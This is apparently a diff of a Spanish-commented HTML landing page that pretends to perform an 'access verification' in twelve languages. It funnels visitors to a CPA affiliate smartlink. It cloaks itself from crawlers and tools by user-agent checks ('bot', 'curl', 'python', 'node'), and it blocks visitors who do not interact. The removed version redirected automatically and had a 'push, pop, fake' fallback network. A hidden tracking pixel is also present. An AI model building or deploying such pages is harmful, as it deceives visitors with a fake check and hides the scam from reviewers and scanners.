@@ -1,61 +1,177 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirigiendo...</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>🔥 Verificación requerida</title>
+  <meta name="theme-color" content="#ff004f"/>
   <style>
     body {
-      margin: 0;
-      background-color: #000;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      color: #fff;
-      font-family: Arial, sans-serif;
-    }
-    .msg {
+      background: url('https://i.pinimg.com/originals/07/44/76/074476209bb41a39913981195e17e363.gif') no-repeat center center fixed;
+      background-size: cover;
+      font-family: sans-serif;
+      color: white;
       text-align: center;
-      font-size: 1.2em;
+      padding: 60px 20px;
     }
+    .overlay {
+      background: rgba(0, 0, 0, 0.75);
+      padding: 30px;
+      border-radius: 15px;
+      display: inline-block;
+    }
+    h1 {
+      font-size: 2.2em;
+    }
+    p {
+      font-size: 1.2em;
+      margin-bottom: 25px;
+    }
+    button {
+      background: #ff004f;
+      border: none;
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 30px;
+      cursor: pointer;
+      color: white;
+      box-shadow: 0 0 15px #ff004f;
+    }
+    #cta { display: none; }
   </style>
 </head>
 <body>
-  <div class="msg">
-    <p>Verifying information....</p>
+  <div class="overlay">
+    <h1 id="title">Checking your access...</h1>
+    <p id="message">Please interact to continue</p>
+    <div id="cta">
+      <button onclick="goCPA()" id="ctaBtn">Enter now 🔥</button>
+    </div>
   </div>
 
   <script>
-    // Lista de enlaces CPA
-    const smartlinks = [
-      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
-      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
-      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global",
-      "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global"
-    ];
+    const cpaUrl = "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global"; // CAMBIA ESTO POR TU LINK CPA
 
-    // Red secundaria (push, pop, fake)
-    const fallback = "https://daupmrb.vipsthelovehaven.com/um9h34e";
-
-    // Detección básica de bots
-    const isBot = /bot|crawl|preview|spider|facebook|whatsapp|headless|phantom/i.test(navigator.userAgent);
-    const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-    const screenOK = window.innerWidth > 300 && window.innerHeight > 300;
-
-    // Redirigir en 2 segundos si pasa el filtro
-    setTimeout(() => {
-      if (!isBot && hasTouch && screenOK) {
-        const finalLink = smartlinks[Math.floor(Math.random() * smartlinks.length)];
-        window.location.href = finalLink;
-      } else {
-        window.location.href = fallback;
+    const translations = {
+      en: {
+        title: "Checking your access...",
+        message: "Please interact to continue",
+        button: "Enter now 🔥"
+      },
+      es: {
+        title: "Verificando tu acceso...",
+        message: "Por favor, interactúa para continuar",
+        button: "Entrar ahora 🔥"
+      },
+      fr: {
+        title: "Vérification d'accès...",
+        message: "Veuillez interagir pour continuer",
+        button: "Entrer maintenant 🔥"
+      },
+      de: {
+        title: "Zugriff wird überprüft...",
+        message: "Bitte interagieren Sie, um fortzufahren",
+        button: "Jetzt eintreten 🔥"
+      },
+      it: {
+        title: "Verifica dell'accesso...",
+        message: "Interagisci per continuare",
+        button: "Entra ora 🔥"
+      },
+      ro: {
+        title: "Verificare acces...",
+        message: "Vă rugăm să interacționați pentru a continua",
+        button: "Intră acum 🔥"
+      },
+      pt: {
+        title: "Verificando o acesso...",
+        message: "Por favor, interaja para continuar",
+        button: "Entrar agora 🔥"
+      },
+      nl: {
+        title: "Toegang controleren...",
+        message: "Gelieve te interageren om verder te gaan",
+        button: "Nu binnenkomen 🔥"
+      },
+      pl: {
+        title: "Sprawdzanie dostępu...",
+        message: "Proszę się zaangażować, aby kontynuować",
+        button: "Wejdź teraz 🔥"
+      },
+      hu: {
+        title: "Hozzáférés ellenőrzése...",
+        message: "Kérjük, lépj kapcsolatba a folytatáshoz",
+        button: "Belépés most 🔥"
+      },
+      bg: {
+        title: "Проверка на достъпа...",
+        message: "Моля, взаимодействайте, за да продължите",
+        button: "Влез сега 🔥"
+      },
+      el: {
+        title: "Έλεγχος πρόσβασης...",
+        message: "Παρακαλώ αλληλεπιδράστε για να συνεχίσετε",
+        button: "Είσοδος τώρα 🔥"
       }
-    }, 2000);
-  </script>
+    };
 
-  <!-- Pixel invisible opcional -->
-   <div style="visibility:hidden">
+    const badAgents = ['bot', 'crawler', 'spider', 'curl', 'python', 'node'];
+    let interacted = false;
+
+    function getLang() {
+      const lang = navigator.language.slice(0, 2);
+      return translations[lang] ? lang : 'en';
+    }
+
+    function applyLang(lang) {
+      const t = translations[lang];
+      document.getElementById('title').innerText = t.title;
+      document.getElementById('message').innerText = t.message;
+      document.getElementById('ctaBtn').innerText = t.button;
+    }
+
+    function detectBot() {
+      const ua = navigator.userAgent.toLowerCase();
+      return badAgents.some(a => ua.includes(a));
+    }
+
+    function showCTA() {
+      document.getElementById('cta').style.display = 'block';
+    }
+
+    function registerInteraction() {
+      if (!interacted) {
+        interacted = true;
+        showCTA();
+      }
+    }
+
+    function goCPA() {
+      window.location.href = cpaUrl;
+    }
+
+    // Detect idioma
+    applyLang(getLang());
+
+    // Detect bot
+    if (detectBot()) {
+      document.body.innerHTML = "<h2>🚫 Access denied (bot)</h2>";
+    }
+
+    // Si no hay interacción = bloquear
+    setTimeout(() => {
+      if (!interacted) {
+        document.body.innerHTML = "<h2>⛔ Access denied</h2>";
+      }
+    }, 10000);
+
+    // Eventos humanos
+    document.addEventListener("mousemove", registerInteraction);
+    document.addEventListener("click", registerInteraction);
+    document.addEventListener("scroll", registerInteraction);
+    document.addEventListener("keydown", registerInteraction);
+  </script>
+  <div style="visibility:hidden">
     <center>
       <img src="//whos.amung.us/pingjs/?k=lonelywolf&amp;t=TeamCastle&amp;x=https://www.youtube.com/" style="display:none">
     </center>
